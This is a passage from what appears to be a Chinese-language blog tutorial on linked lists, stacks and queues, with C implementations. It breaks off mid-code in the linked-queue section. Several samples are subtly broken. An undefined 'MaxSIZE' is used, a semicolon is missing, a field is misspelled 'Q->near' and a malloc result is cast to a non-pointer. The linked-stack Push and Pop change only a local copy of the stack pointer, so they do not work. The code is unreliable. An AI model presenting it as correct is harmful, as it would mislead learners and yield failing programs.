<strong><em>●在插入和删除操作时，只需要修改游标，不需要移动元素，从而改进了在顺序存储结构中的插入和删除操作</em></strong></p><p><strong><em>需要移动大量元素的缺点</em></strong></p><p><strong><em>2、缺点：</em></strong></p><p>​        <strong><em>●没有解决连续存储分配带来的表长难以确定的问题</em></strong></p><p>​        <strong><em>●失去了顺序存储结构随机存取的特性</em></strong></p><h2 id="双向链表"><a href="#双向链表" class="headerlink" title="双向链表"></a>双向链表</h2><h3 id="定义-3"><a href="#定义-3" class="headerlink" title="定义"></a>定义</h3><p>双向链表是在单链表的每个节点中，再设置一个指向其前驱节点的指针域，前驱后继方向都能遍历；</p><h3 id="存储结构"><a href="#存储结构" class="headerlink" title="存储结构"></a>存储结构</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> DulNode<span class="token punctuation">{</span>    ElemType data<span class="token punctuation">;</span>    <span class="token keyword">struct</span> DulNode<span class="token operator">*</span> prior<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//直接前驱指针</span>    <span class="token keyword">struct</span> DulNode<span class="token operator">*</span> next<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//直接后继指针</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>显然，与单链表相比，多了一个直接前驱；</p><h2 id="循环链表"><a href="#循环链表" class="headerlink" title="循环链表"></a>循环链表</h2><h3 id="定义-4"><a href="#定义-4" class="headerlink" title="定义"></a>定义</h3><p>循环链表——首尾相连的链表；</p><p>将单链表中终端节点的指针端由空指针改为指向头节点，就使整个单链表形成一个环。这种头尾相接的单链表称为</p><p>单循环链表，简称循环链表；</p><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>循环链表中，从任一节点出发都可以访问到表中所有节点，在单链表中，必须从头指针开始，否则无法访问到该节</p><p>点之前的其他节点；</p><p>循环链表好像用处不太大，就不多说了；</p><h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><p>这一章节是线性表，线性表对于以后学习的数据结构会有很大作用；选择使用哪种线性表，结合情况再定，各有利</p><p>弊；   // 下一章学习栈，不见不散；</p><p>Bye~~</p><h1 id="栈—Stack"><a href="#栈—Stack" class="headerlink" title="栈—Stack"></a><u>栈</u>—Stack</h1><p>线性表总的来说是挺简单的（和链表差不多），学好线性表才可以继续学习哦~</p><p>下面我们开始学习栈</p><h2 id="定义-5"><a href="#定义-5" class="headerlink" title="定义"></a>定义</h2><p><u><strong><em>栈是限定仅在表尾进行插入和删除操作的线性表；</em></strong></u></p><p>允许插入和删除的一端称为栈顶，另一端称为栈底，不含任何数据元素的栈称为空栈，栈又称为后进先出线性表，</p><p>简称LIFO结构；</p><h2 id="栈的抽象数据类型——基本操作-入栈-出栈"><a href="#栈的抽象数据类型——基本操作-入栈-出栈" class="headerlink" title="栈的抽象数据类型——基本操作( 入栈 出栈 )"></a>栈的抽象数据类型——基本操作( 入栈 出栈 )</h2><pre class="line-numbers language-c"><code class="language-c"><span class="token number">1</span>、<span class="token function">InitStack</span><span class="token punctuation">(</span><span class="token operator">*</span>S<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//初始化操作，建立一个空栈</span><span class="token number">2</span>、<span class="token function">DestroyStack</span><span class="token punctuation">(</span><span class="token operator">*</span>S<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//若栈存在，则销毁它</span><span class="token number">3</span>、<span class="token function">ClearStack</span><span class="token punctuation">(</span><span class="token operator">*</span>S<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//将栈清空</span><span class="token number">4</span>、<span class="token function">StackEmpty</span><span class="token punctuation">(</span><span class="token operator">*</span>S<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//若栈为空，返回true，否则返回false</span><span class="token number">5</span>、<span class="token function">GetTop</span><span class="token punctuation">(</span>S<span class="token punctuation">,</span> <span class="token operator">*</span>e<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//若栈存在且非空，用e返回S的栈顶元素</span><span class="token number">6</span>、<span class="token function">Push</span><span class="token punctuation">(</span><span class="token operator">*</span>S<span class="token punctuation">,</span> e<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//若栈S存在，插入新元素e到栈S中并成为栈顶元素</span><span class="token number">7</span>、<span class="token function">Pop</span><span class="token punctuation">(</span><span class="token operator">*</span>S<span class="token punctuation">,</span> <span class="token operator">*</span>e<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//删除栈S中栈顶元素，并用e返回其值</span><span class="token number">8</span>、<span class="token function">StackLength</span><span class="token punctuation">(</span>S<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//返回栈S的元素个数</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="栈的顺序存储结构"><a href="#栈的顺序存储结构" class="headerlink" title="栈的顺序存储结构"></a>栈的顺序存储结构</h2><h3 id="结构代码"><a href="#结构代码" class="headerlink" title="结构代码"></a>结构代码</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> MAXSIZE 1000</span><span class="token keyword">typedef</span> <span class="token keyword">int</span> DataType<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span>    DataType data<span class="token punctuation">[</span>MAXSIZE<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//栈的元素最大个数</span>    <span class="token keyword">int</span> top<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//用于栈顶指针</span><span class="token punctuation">}</span>SqStack<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="初始化栈"><a href="#初始化栈" class="headerlink" title="初始化栈"></a>初始化栈</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">InitStack</span><span class="token punctuation">(</span>SqStack<span class="token operator">*</span> S<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//初始化栈</span><span class="token punctuation">{</span>    S<span class="token operator">-></span>top <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//初始化栈为空</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="判断栈是否已满"><a href="#判断栈是否已满" class="headerlink" title="判断栈是否已满"></a>判断栈是否已满</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">StackFull</span><span class="token punctuation">(</span>SqStack<span class="token operator">*</span> S<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//判断栈是否已满</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>S<span class="token operator">-></span>top <span class="token operator">==</span> MaxSIZE <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="判断栈是否为空"><a href="#判断栈是否为空" class="headerlink" title="判断栈是否为空"></a>判断栈是否为空</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">StackEmpty</span><span class="token punctuation">(</span>SqStack<span class="token operator">*</span> S<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//判断栈是否为空</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>S<span class="token operator">-></span>top <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">else</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="进栈"><a href="#进栈" class="headerlink" title="进栈"></a>进栈</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">Push</span><span class="token punctuation">(</span>SqStack<span class="token operator">*</span> S<span class="token punctuation">,</span> DataType e<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//进栈操作 插入元素e为新的栈顶元素</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">StackFull</span><span class="token punctuation">(</span>S<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//栈满</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    S<span class="token operator">-></span>top<span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//栈顶指针增加1</span>    S<span class="token operator">-></span>data<span class="token punctuation">[</span>S<span class="token operator">-></span>top<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//新插入元素赋值给栈顶空间</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="出栈"><a href="#出栈" class="headerlink" title="出栈"></a>出栈</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">Pop</span><span class="token punctuation">(</span>SqStack<span class="token operator">*</span> S<span class="token punctuation">,</span> DataType<span class="token operator">*</span> e<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//出栈操作 若栈不为空，则删除栈顶元素，用e返回其值</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">StackEmpty</span><span class="token punctuation">(</span>S<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//栈空</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token operator">*</span>e <span class="token operator">=</span> S<span class="token operator">-></span>data<span class="token punctuation">[</span>S<span class="token operator">-></span>top<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将要删除的元素赋值给e</span>    S<span class="token operator">-></span>top<span class="token operator">--</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//栈顶指针减少1</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="栈的链式存储结构"><a href="#栈的链式存储结构" class="headerlink" title="栈的链式存储结构"></a>栈的链式存储结构</h2><h3 id="结构代码-1"><a href="#结构代码-1" class="headerlink" title="结构代码"></a>结构代码</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> MAXSIZE 1000</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> StackNode<span class="token punctuation">{</span>    DataType data<span class="token punctuation">;</span>    <span class="token keyword">struct</span> StackNode<span class="token operator">*</span> next<span class="token punctuation">;</span><span class="token punctuation">}</span>LinkStack<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="初始化栈-1"><a href="#初始化栈-1" class="headerlink" title="初始化栈"></a>初始化栈</h3><pre class="line-numbers language-c"><code class="language-c">LinkStack<span class="token operator">*</span> <span class="token function">InitStack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    LinkStack<span class="token operator">*</span> S<span class="token punctuation">;</span>    S <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//初始化栈为空</span>    <span class="token keyword">return</span> S<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="判断栈是否为空-1"><a href="#判断栈是否为空-1" class="headerlink" title="判断栈是否为空"></a>判断栈是否为空</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">EmptyStack</span><span class="token punctuation">(</span>LinkStack<span class="token operator">*</span> S<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>S <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="进栈-1"><a href="#进栈-1" class="headerlink" title="进栈"></a>进栈</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">Push</span><span class="token punctuation">(</span>LinkStack<span class="token operator">*</span> S<span class="token punctuation">,</span> DataType e<span class="token punctuation">)</span><span class="token punctuation">{</span>    LinkStack<span class="token operator">*</span> p <span class="token operator">=</span> <span class="token punctuation">(</span>LinkStack<span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>LinkStack<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    p<span class="token operator">-></span>data <span class="token operator">=</span> e<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//e放入新节点的数据域</span>    p<span class="token operator">-></span>next <span class="token operator">=</span> S<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//新节点插入链表表头之前</span>    S <span class="token operator">=</span> p<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//新节点作为栈顶</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="出栈-1"><a href="#出栈-1" class="headerlink" title="出栈"></a>出栈</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">Pop</span><span class="token punctuation">(</span>LinkStack<span class="token operator">*</span> S<span class="token punctuation">,</span> DataType<span class="token operator">*</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>    LinkStack<span class="token operator">*</span> p<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">EmptyStack</span><span class="token punctuation">(</span>S<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token operator">*</span>e <span class="token operator">=</span> S<span class="token operator">-></span>data<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//栈顶元素赋值给e</span>    p <span class="token operator">=</span> S<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//p节点指向原栈顶S</span>    S <span class="token operator">=</span> S<span class="token operator">-></span>next<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//原栈顶S指向其下一个节点</span>    <span class="token function">free</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//释放原栈顶空间</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="取栈顶元素"><a href="#取栈顶元素" class="headerlink" title="取栈顶元素"></a>取栈顶元素</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">GetTop</span><span class="token punctuation">(</span>LinkStack<span class="token operator">*</span> S<span class="token punctuation">,</span> DataType<span class="token operator">*</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">EmptyStack</span><span class="token punctuation">(</span>S<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//栈为空</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token operator">*</span>e <span class="token operator">=</span> S<span class="token operator">-></span>data<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//栈顶元素赋给变量e</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="遍历栈"><a href="#遍历栈" class="headerlink" title="遍历栈"></a>遍历栈</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">ShowStack</span><span class="token punctuation">(</span>LinkStack<span class="token operator">*</span> S<span class="token punctuation">)</span><span class="token punctuation">{</span>    LinkStack<span class="token operator">*</span> p <span class="token operator">=</span> S<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"栈为空\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>p <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> p<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        p <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="小结-2"><a href="#小结-2" class="headerlink" title="小结"></a>小结</h2><p>栈相对来说就是比较特殊的线性表罢了，接下来要学习的队列，也是一种特殊的线性表；让我们拭目以待 // Bye~ </p><h1 id="队列—Queue"><a href="#队列—Queue" class="headerlink" title="队列—Queue"></a>队列—Queue</h1><h2 id="定义-6"><a href="#定义-6" class="headerlink" title="定义"></a>定义</h2><p><u><strong><em>队列是只允许在一端进行插入操作，在另一端进行删除操作的线性表；</em></strong></u></p><p>队列是一种先进先出的线性表，简称FIFO；允许插入的一端称为队尾，允许删除的一端称为队头；</p><h2 id="队列的抽象数据类型——基本操作"><a href="#队列的抽象数据类型——基本操作" class="headerlink" title="队列的抽象数据类型——基本操作"></a>队列的抽象数据类型——基本操作</h2><pre class="line-numbers language-c"><code class="language-c"><span class="token number">1</span>、<span class="token function">InitQueue</span><span class="token punctuation">(</span><span class="token operator">*</span>Q<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//初始化操作，建立一个空队列</span><span class="token number">2</span>、<span class="token function">DestroyQueue</span><span class="token punctuation">(</span><span class="token operator">*</span>Q<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//若队列Q存在，则销毁</span><span class="token number">3</span>、<span class="token function">ClearQueue</span><span class="token punctuation">(</span><span class="token operator">*</span>Q<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//将队列Q清空</span><span class="token number">4</span>、<span class="token function">QueueEmpty</span><span class="token punctuation">(</span>Q<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//若队列为空，返回true，否则返回false</span><span class="token number">5</span>、<span class="token function">GetHead</span><span class="token punctuation">(</span>Q<span class="token punctuation">,</span><span class="token operator">*</span>e<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//若队列存在且非空，用e返回Q的队头元素</span><span class="token number">6</span>、<span class="token function">EnQueu</span><span class="token punctuation">(</span><span class="token operator">*</span>Q<span class="token punctuation">,</span>e<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//若队列存在，则插入e于Q，并成为队尾元素</span><span class="token number">7</span>、<span class="token function">DeQueue</span><span class="token punctuation">(</span><span class="token operator">*</span>Q<span class="token punctuation">,</span><span class="token operator">*</span>e<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 删除队列Q中队头元素，并用e返回其值</span><span class="token number">8</span>、<span class="token function">QueueLength</span><span class="token punctuation">(</span>Q<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//返回队列Q中元素个数</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="循环队列"><a href="#循环队列" class="headerlink" title="循环队列"></a>循环队列</h2><h3 id="队列顺序存储的不足"><a href="#队列顺序存储的不足" class="headerlink" title="队列顺序存储的不足"></a>队列顺序存储的不足</h3><p>与栈不同的是，队列的出列是在队头，那就意味着，队列的所有元素都得移动，以保证下标为0的位置不为空，此</p><p>时间复杂度为O(n);</p><p>为了避免当只有一个元素时，队头和队尾重合使处理变得麻烦，所以引入两个指针，front指针指向队头元素，</p><p>rear指针指向队尾元素的下一个位置，这样当front等于rear时，此队列不是还剩一个元素，而是空队列；</p><p>假溢出：说白了就是数组末尾元素已满，再向后加就越界，而队列前面还有空位的现象（0,1,2….空着）；</p><h3 id="循环队列定义"><a href="#循环队列定义" class="headerlink" title="循环队列定义"></a>循环队列定义</h3><p>头尾相接顺序存储结构称为循环队列；</p><p>设队列最大长度为QueueSize，那么：</p><p>队列满的条件为(rear+1) % QueueSize == front ;</p><p>队空条件为front == rear ;</p><p>队列长度计算公式为(rear-front+QueueSize) % QueueSize ; (自己推导式子很简单)</p><h3 id="循环队列顺序存储结构"><a href="#循环队列顺序存储结构" class="headerlink" title="循环队列顺序存储结构"></a>循环队列顺序存储结构</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> MAXSIZE 1000</span><span class="token keyword">typedef</span> <span class="token keyword">int</span> DataType<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span>    DataType data<span class="token punctuation">[</span>MAXSIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> front<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//头指针</span>    <span class="token keyword">int</span> rear<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//尾指针，若队列不变，指向队列尾元素的下一个位置</span><span class="token punctuation">}</span>SqQueue<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="队列初始化"><a href="#队列初始化" class="headerlink" title="队列初始化"></a>队列初始化</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">InitQueue</span><span class="token punctuation">(</span>SqQueue <span class="token operator">*</span>Q<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//初始化一个对列</span><span class="token punctuation">{</span>    Q<span class="token operator">-></span>front <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    Q<span class="token operator">-></span>rear <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="队列长度"><a href="#队列长度" class="headerlink" title="队列长度"></a>队列长度</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">QueueLength</span><span class="token punctuation">(</span>SqQueue Q<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//求队列长度</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>Q<span class="token punctuation">.</span>rear <span class="token operator">-</span> Q<span class="token punctuation">.</span>front <span class="token operator">+</span> MAXSIZE<span class="token punctuation">)</span> <span class="token operator">%</span> MAXSIZE<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="入队"><a href="#入队" class="headerlink" title="入队"></a>入队</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">EnQueue</span><span class="token punctuation">(</span>SqQueue<span class="token operator">*</span> Q<span class="token punctuation">,</span> DataType e<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//若队列未满则e入列</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>Q<span class="token operator">-></span>rear <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> MAXSIZE <span class="token operator">==</span> Q<span class="token operator">-></span>front<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//队列已满</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    Q<span class="token operator">-></span>data<span class="token punctuation">[</span>Q<span class="token operator">-></span>rear<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//e赋值给队尾</span>    Q<span class="token operator">-></span>rear <span class="token operator">=</span> <span class="token punctuation">(</span>Q<span class="token operator">-></span>rear <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> MAXSIZE<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//rear指针后移一个位置，若到最后则转到数组头部</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="出队"><a href="#出队" class="headerlink" title="出队"></a>出队</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">DeQueue</span><span class="token punctuation">(</span>SqQueue<span class="token operator">*</span> Q<span class="token punctuation">,</span> DataType<span class="token operator">*</span> e<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//若队列不空则删除队头，并用e返回其值</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>Q<span class="token operator">-></span>front <span class="token operator">==</span> Q<span class="token operator">-></span>near<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//队列为空</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token operator">*</span>e <span class="token operator">=</span> Q<span class="token operator">-></span>data<span class="token punctuation">[</span>Q<span class="token operator">-></span>front<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将队头元素赋值给e</span>    Q<span class="token operator">-></span>front <span class="token operator">=</span> <span class="token punctuation">(</span>Q<span class="token operator">-></span>front <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> MAXSIZE<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//front指针向后移一位置，若到最后则转到数组头部</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="队列的链式存储结构及实现"><a href="#队列的链式存储结构及实现" class="headerlink" title="队列的链式存储结构及实现"></a>队列的链式存储结构及实现</h2><p>队列的链式存储结构，其实就是线性表的单链表，只不过它只能尾进头出而已，我们把它简称为链队列；</p><h3 id="链式队列存储结构"><a href="#链式队列存储结构" class="headerlink" title="链式队列存储结构"></a>链式队列存储结构</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">int</span> DataType<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> qnode<span class="token punctuation">{</span>    DataType data<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//节点的数据域</span>    <span class="token keyword">struct</span> qnode<span class="token operator">*</span> next<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//节点的指针域</span><span class="token punctuation">}</span>LinkListQ<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span>    LinkListQ<span class="token operator">*</span> front<span class="token punctuation">,</span> <span class="token operator">*</span> rear<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//队列的队头和队尾指针</span><span class="token punctuation">}</span>LinkQueue<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="队列初始化-1"><a href="#队列初始化-1" class="headerlink" title="队列初始化"></a>队列初始化</h3><pre class="line-numbers language-c"><code 